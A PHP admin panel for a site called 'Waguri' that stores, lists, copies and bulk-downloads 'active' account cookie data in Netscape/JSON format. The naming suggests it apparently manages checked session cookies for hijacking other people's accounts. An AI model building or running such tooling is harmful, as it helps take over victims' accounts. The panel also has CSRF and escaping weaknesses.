<?php
session_start();
require_once '../db.php'; // Go up one directory to find db.php

$error_msg = '';

// Handle Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header("Location: admin.php");
    exit;
}

// Handle Download All Cookies
if (isset($_GET['action']) && $_GET['action'] === 'download') {
    if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
        try {
            $stmt = $pdo->query("SELECT cookie_data FROM active_accounts ORDER BY date_checked DESC");
            $cookies = $stmt->fetchAll(PDO::FETCH_COLUMN);

            // Clean any output buffers to prevent corrupted files with stray HTML
            if (ob_get_length()) ob_clean();

            // Set headers to force download as a pure text file
            header('Content-Type: text/plain; charset=utf-8');
            header('Content-Disposition: attachment; filename="waguri_active_cookies_' . date('Y-m-d') . '.txt"');

            // Format cookies and separate them strictly with the universal separator ( | )
            $formatted_cookies = [];
            foreach ($cookies as $cookie) {
                // Trim whitespace from beginning and end of each individual cookie
                $formatted_cookies[] = trim($cookie);
            }
            
            // Join all cookies with a newline, pipe, and newline so they are clearly separated
            echo implode("\r\n|\r\n", $formatted_cookies);
            exit; // Stop execution so no HTML is appended to the text file
            
        } catch (\PDOException $e) {
            $error_msg = "Failed to download cookies: " . $e->getMessage();
        }
    }
}

// Handle Delete Single Cookie
if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['id'])) {
    if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
        try {
            $del_stmt = $pdo->prepare("DELETE FROM active_accounts WHERE id = ?");
            $del_stmt->execute([$_GET['id']]);
            // Go back to the current page after deleting
            $ret_page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
            header("Location: admin.php?page=" . $ret_page);
            exit;
        } catch (\PDOException $e) {
            $error_msg = "Failed to delete: " . $e->getMessage();
        }
    }
}

// Handle Delete ALL Cookies
if (isset($_GET['action']) && $_GET['action'] === 'delete_all') {
    if (isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
        try {
            $pdo->exec("DELETE FROM active_accounts");
            header("Location: admin.php");
            exit;
        } catch (\PDOException $e) {
            $error_msg = "Failed to delete all cookies: " . $e->getMessage();
        }
    }
}

// Handle Login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if (!empty($username) && !empty($password) && isset($pdo)) {
        $stmt = $pdo->prepare("SELECT * FROM admins WHERE username = ?");
        $stmt->execute([$username]);
        $admin_user = $stmt->fetch(PDO::FETCH_ASSOC);

        // Verify hashed password
        if ($admin_user && password_verify($password, $admin_user['password_hash'])) {
            $_SESSION['admin_logged_in'] = true;
            $_SESSION['admin_username'] = $admin_user['username'];
            header("Location: admin.php");
            exit;
        } else {
            $error_msg = "Invalid username or password.";
        }
    } else {
        $error_msg = "Please fill in all fields or check database connection.";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Waguri Admin Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <!-- SweetAlert2 CDN -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
        
        body {
            background-color: #09090b;
            color: #f8fafc;
            font-family: 'Inter', sans-serif;
            background-image: radial-gradient(circle at 50% 0%, rgba(244, 63, 94, 0.1) 0%, transparent 50%);
            background-repeat: no-repeat;
            min-height: 100vh;
        }

        .premium-card {
            background: #121214;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
        }

        .form-input {
            background: rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.08);
            color: #fff;
            border-radius: 12px;
            padding: 12px 16px;
            width: 100%;
            transition: all 0.3s ease;
        }
        .form-input:focus {
            outline: none;
            border-color: #f43f5e;
            box-shadow: 0 0 0 4px rgba(244, 63, 94, 0.15);
        }

        .btn-primary {
            background: linear-gradient(135deg, #f43f5e, #8b5cf6);
            color: #fff;
            border: none;
            border-radius: 12px;
            padding: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            width: 100%;
            cursor: pointer;
            transition: 0.3s;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(244, 63, 94, 0.4);
        }

        /* Custom Scrollbar for Table */
        ::-webkit-scrollbar { width: 8px; height: 8px; }
        ::-webkit-scrollbar-track { background: #09090b; }
        ::-webkit-scrollbar-thumb { background: #27272a; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #3f3f46; }

        /* SweetAlert Custom Overrides */
        div:where(.swal2-container) div:where(.swal2-popup) {
            border: 1px solid rgba(255, 255, 255, 0.08) !important;
            border-radius: 16px !important;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen">

<?php if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true): ?>
    <!-- LOGIN PORTAL -->
    <div class="premium-card p-8 w-full max-w-md mx-4">
        <div class="text-center mb-8">
            <!-- Custom Logo Image (replace "../your-logo.png" with your actual file path/URL) -->
            <img src="../waguri1.png" alt="Waguri Logo" class="mx-auto mb-4" style="width: 64px; height: 64px; object-fit: contain; border-radius: 12px;">
            <h2 class="text-2xl font-bold">Admin Portal</h2>
            <p class="text-gray-400 text-sm mt-1">Authenticate to access Waguri database</p>
        </div>

        <?php if ($error_msg): ?>
            <div class="bg-red-500/10 border border-red-500/20 text-red-400 p-3 rounded-lg text-sm mb-4 text-center">
                <?php echo htmlspecialchars($error_msg); ?>
            </div>
        <?php endif; ?>

        <form method="POST" action="">
            <div class="mb-4">
                <label class="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2">Username</label>
                <input type="text" name="username" class="form-input" required placeholder="Enter admin username">
            </div>
            <div class="mb-6">
                <label class="block text-xs font-bold text-gray-400 uppercase tracking-wider mb-2">Password</label>
                <input type="password" name="password" class="form-input" required placeholder="••••••••">
            </div>
            <button type="submit" name="login" class="btn-primary">
                Secure Login <i class="fas fa-arrow-right ml-2"></i>
            </button>
        </form>
    </div>

<?php else: ?>
    <!-- NAVIGATION BAR -->
    <nav class="w-full bg-[#121214]/90 backdrop-blur-md border-b border-white/10 fixed top-0 left-0 z-50">
        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-20">
                <!-- Left: Branding -->
                <div class="flex items-center gap-3">
                    <i class="fas fa-shield-alt text-[#f43f5e] text-2xl"></i>
                    <h1 class="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-rose-500 to-purple-500 hidden sm:block">Admin Dashboard</h1>
                    <h1 class="text-xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-rose-500 to-purple-500 sm:hidden">Admin</h1>
                </div>
                
                <!-- Right: Logout -->
                <div>
                    <a href="?action=logout" class="bg-white/5 hover:bg-red-500/20 border border-white/10 hover:border-red-500/50 text-white hover:text-red-400 px-4 py-2 rounded-lg text-sm font-semibold transition-all shadow-sm">
                        <i class="fas fa-sign-out-alt mr-2"></i> Logout
                    </a>
                </div>
            </div>
        </div>
    </nav>

    <!-- ADMIN DASHBOARD CONTENT -->
    <div class="w-full max-w-6xl px-4 mt-32 mb-10 flex-grow">
        
        <!-- Toolbar & Welcome -->
        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-end mb-6 gap-4">
            <div>
                <p class="text-gray-400 text-sm">Welcome back, <span class="text-white font-semibold"><?php echo htmlspecialchars($_SESSION['admin_username']); ?></span></p>
                <h2 class="text-2xl font-bold mt-1">Cookie Management</h2>
            </div>
            <div class="flex flex-wrap gap-3 w-full sm:w-auto">
                <button onclick="confirmDeleteAll()" class="flex-1 sm:flex-none text-center bg-red-500/10 hover:bg-red-500/20 border border-red-500/20 hover:border-red-500/50 text-red-400 px-4 py-2 rounded-lg text-sm font-semibold transition-all">
                    <i class="fas fa-trash-alt mr-2"></i> Delete All
                </button>
                <a href="?action=download" class="flex-1 sm:flex-none text-center bg-green-500/10 hover:bg-green-500/20 border border-green-500/20 hover:border-green-500/50 text-green-400 px-4 py-2 rounded-lg text-sm font-semibold transition-all">
                    <i class="fas fa-download mr-2"></i> Download (.txt)
                </a>
            </div>
        </div>

        <?php if ($error_msg): ?>
            <div class="bg-red-500/10 border border-red-500/20 text-red-400 p-3 rounded-lg text-sm mb-4">
                <i class="fas fa-exclamation-circle mr-1"></i> <?php echo htmlspecialchars($error_msg); ?>
            </div>
        <?php endif; ?>

        <!-- COOKIES TABLE WIDGET -->
        <div class="premium-card overflow-hidden">
            <div class="overflow-x-auto">
                <table class="w-full text-left text-sm whitespace-nowrap">
                    <thead class="uppercase tracking-wider border-b border-white/10 bg-white/5 text-gray-400 text-xs font-semibold">
                        <tr>
                            <th class="px-6 py-4">ID</th>
                            <th class="px-6 py-4">Date Saved</th>
                            <th class="px-6 py-4">Cookie Data (Netscape/JSON)</th>
                            <th class="px-6 py-4 text-center">Action</th>
                        </tr>
                    </thead>
                    <tbody class="divide-y divide-white/5">
                        <?php
                        try {
                            // Pagination logic
                            $limit = 10;
                            $page = isset($_GET['page']) && is_numeric($_GET['page']) ? (int)$_GET['page'] : 1;
                            if ($page < 1) $page = 1;
                            $offset = ($page - 1) * $limit;

                            // Get total records
                            $count_stmt = $pdo->query("SELECT COUNT(*) FROM active_accounts");
                            $total_records = $count_stmt->fetchColumn();
                            $total_pages = ceil($total_records / $limit);
                            if ($total_pages == 0) $total_pages = 1;

                            // Fetch records for current page securely with parameters
                            $stmt = $pdo->prepare("SELECT * FROM active_accounts ORDER BY date_checked DESC LIMIT :limit OFFSET :offset");
                            $stmt->bindValue(':limit', $limit, PDO::PARAM_INT);
                            $stmt->bindValue(':offset', $offset, PDO::PARAM_INT);
                            $stmt->execute();
                            
                            $accounts = $stmt->fetchAll(PDO::FETCH_ASSOC);

                            if (count($accounts) > 0) {
                                foreach ($accounts as $row) {
                                    $formatted_date = date('M d, Y - h:i A', strtotime($row['date_checked']));
                                    // Limit cookie preview size so table doesn't break
                                    $cookie_preview = htmlspecialchars(substr($row['cookie_data'], 0, 80)) . '...';
                                    $full_cookie = htmlspecialchars($row['cookie_data']);
                                    
                                    echo "<tr class='hover:bg-white/5 transition-colors'>";
                                    echo "<td class='px-6 py-4 font-mono text-gray-400'>#" . $row['id'] . "</td>";
                                    echo "<td class='px-6 py-4'>" . $formatted_date . "</td>";
                                    echo "<td class='px-6 py-4 font-mono text-xs text-gray-300' title='$full_cookie'>" . $cookie_preview . "</td>";
                                    echo "<td class='px-6 py-4 text-center'>
                                            <div class='flex justify-center gap-2'>
                                                <button onclick='copyToClipboard(`" . addslashes($full_cookie) . "`)' class='bg-rose-500/10 text-rose-400 hover:bg-rose-500 hover:text-white px-3 py-1 rounded border border-rose-500/20 transition-all text-xs font-bold'>
                                                    COPY
                                                </button>
                                                <button onclick='confirmDelete(" . $row['id'] . ", " . $page . ")' class='bg-red-500/10 text-red-400 hover:bg-red-600 hover:text-white px-3 py-1 rounded border border-red-500/20 transition-all text-xs font-bold'>
                                                    <i class='fas fa-trash'></i>
                                                </button>
                                            </div>
                                          </td>";
                                    echo "</tr>";
                                }
                            } else {
                                echo "<tr><td colspan='4' class='px-6 py-8 text-center text-gray-400'>No active cookies found in database yet.</td></tr>";
                            }
                        } catch (\PDOException $e) {
                            echo "<tr><td colspan='4' class='px-6 py-8 text-center text-red-400'>Database Error: " . $e->getMessage() . "</td></tr>";
                        }
                        ?>
                    </tbody>
                </table>
            </div>

            <!-- PAGINATION UI -->
            <?php if (isset($total_pages) && $total_pages > 1): ?>
            <div class="px-6 py-4 border-t border-white/10 flex flex-col sm:flex-row justify-between items-center bg-white/5 gap-4">
                <span class="text-sm text-gray-400">
                    Showing <?php echo $offset + 1; ?> to <?php echo min($offset + $limit, $total_records); ?> of <?php echo $total_records; ?> cookies
                </span>
                <div class="flex gap-1">
                    <?php if ($page > 1): ?>
                        <a href="?page=<?php echo $page - 1; ?>" class="px-3 py-1 rounded bg-white/5 border border-white/10 hover:bg-white/10 text-gray-300 text-sm transition-all"><i class="fas fa-chevron-left"></i></a>
                    <?php endif; ?>
                    
                    <?php 
                    // Show up to 5 page numbers around the current page
                    $start_page = max(1, $page - 2);
                    $end_page = min($total_pages, $page + 2);
                    
                    if ($start_page > 1) {
                        echo '<a href="?page=1" class="px-3 py-1 rounded bg-white/5 border border-white/10 hover:bg-white/10 text-gray-300 text-sm transition-all">1</a>';
                        if ($start_page > 2) echo '<span class="px-2 py-1 text-gray-500">...</span>';
                    }

                    for ($i = $start_page; $i <= $end_page; $i++): 
                    ?>
                        <a href="?page=<?php echo $i; ?>" class="px-3 py-1 rounded <?php echo $i == $page ? 'bg-[#f43f5e] text-white border-[#f43f5e]' : 'bg-white/5 border border-white/10 hover:bg-white/10 text-gray-300'; ?> text-sm transition-all"><?php echo $i; ?></a>
                    <?php 
                    endfor; 
                    
                    if ($end_page < $total_pages) {
                        if ($end_page < $total_pages - 1) echo '<span class="px-2 py-1 text-gray-500">...</span>';
                        echo '<a href="?page=' . $total_pages . '" class="px-3 py-1 rounded bg-white/5 border border-white/10 hover:bg-white/10 text-gray-300 text-sm transition-all">' . $total_pages . '</a>';
                    }
                    ?>

                    <?php if ($page < $total_pages): ?>
                        <a href="?page=<?php echo $page + 1; ?>" class="px-3 py-1 rounded bg-white/5 border border-white/10 hover:bg-white/10 text-gray-300 text-sm transition-all"><i class="fas fa-chevron-right"></i></a>
                    <?php endif; ?>
                </div>
            </div>
            <?php endif; ?>
        </div>
    </div>

    <!-- SWEETALERT & UTILITIES SCRIPTS -->
    <script>
        // Custom Dark Theme configuration for SweetAlert2
        const swalDark = Swal.mixin({
            background: '#121214',
            color: '#f8fafc',
            customClass: {
                popup: 'border border-white/10 rounded-2xl shadow-2xl',
                title: 'text-white',
                confirmButton: 'bg-gradient-to-r from-rose-500 to-purple-500 hover:shadow-lg hover:shadow-rose-500/40 text-white px-6 py-2 rounded-lg font-bold ml-2 transition-all',
                cancelButton: 'bg-white/5 border border-white/10 text-white px-6 py-2 rounded-lg font-bold mr-2 hover:bg-white/10 transition-all'
            },
            buttonsStyling: false
        });

        // Trigger for single item deletion
        function confirmDelete(id, page) {
            swalDark.fire({
                title: 'Delete Cookie?',
                text: "You won't be able to revert this!",
                icon: 'warning',
                iconColor: '#f43f5e',
                showCancelButton: true,
                confirmButtonText: '<i class="fas fa-trash mr-2"></i> Yes, delete it',
                cancelButtonText: 'Cancel'
            }).then((result) => {
                if (result.isConfirmed) {
                    window.location.href = `?action=delete&id=${id}&page=${page}`;
                }
            });
        }

        // Trigger for deleting all items
        function confirmDeleteAll() {
            swalDark.fire({
                title: 'Delete ALL Cookies?',
                text: "This will wipe all cookies from your database. This action cannot be undone!",
                icon: 'error',
                iconColor: '#ef4444',
                showCancelButton: true,
                confirmButtonText: '<i class="fas fa-skull mr-2"></i> WIPE EVERYTHING',
                cancelButtonText: 'Cancel'
            }).then((result) => {
                if (result.isConfirmed) {
                    window.location.href = '?action=delete_all';
                }
            });
        }

        // Copy functionality with SweetAlert Toast notification
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                Swal.fire({
                    toast: true,
                    position: 'top-end',
                    icon: 'success',
                    iconColor: '#10b981',
                    title: 'Copied to clipboard!',
                    showConfirmButton: false,
                    timer: 2000,
                    background: '#121214',
                    color: '#f8fafc',
                    customClass: { popup: 'border border-white/10 rounded-xl' }
                });
            }).catch(err => {
                swalDark.fire('Error', 'Failed to copy cookie: ' + err, 'error');
            });
        }
    </script>
<?php endif; ?>

</body>
</html>